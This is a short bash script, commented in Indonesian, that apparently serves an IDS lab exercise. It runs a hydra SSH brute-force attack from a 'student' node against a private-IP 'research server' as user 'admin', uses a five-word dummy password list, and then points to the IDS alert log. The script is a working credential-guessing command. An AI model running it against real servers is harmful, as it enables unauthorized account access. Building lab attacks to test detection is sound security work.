#!/bin/bash
# ==============================================================================
# SCRIPT SIMULASI: SSH BRUTE FORCE
# ==============================================================================
# INSTRUKSI PENGGUNAAN:
# 1. Salin script ini ke Node Mahasiswa.
# 2. Pastikan 'hydra' terinstall (apt install hydra).
# 3. Beri izin eksekusi: chmod +x simulasi_bruteforce.sh
# 4. Jalankan: ./simulasi_bruteforce.sh
# ==============================================================================

TARGET="10.20.30.10" # IP Server Riset
USER="admin"
PASSLIST="pass_list.txt"

# Membuat dummy password list jika belum ada
if [ ! -f $PASSLIST ]; then
    echo "[*] Membuat file dummy password list..."
    echo "123456" > $PASSLIST
    echo "password" >> $PASSLIST
    echo "qwerty" >> $PASSLIST
    echo "admin123" >> $PASSLIST
    echo "riset" >> $PASSLIST
fi

echo "[*] Memulai Simulasi Serangan: SSH Brute Force (Mahasiswa -> Riset)"
echo "[*] Target: ssh://$TARGET"
echo "[*] User: $USER"
echo "------------------------------------------------------------------"

# Menjalankan Hydra
# -l: login name
# -P: file password list
# -t 4: 4 tasks/threads (mempercepat agar trigger threshold IDS)
# -V: Verbose (tampilkan progress)
hydra -l $USER -P $PASSLIST ssh://$TARGET -t 4 -V

echo "------------------------------------------------------------------"
echo "[*] Simulasi Selesai. Cek alert pada IDS (fast.log)"
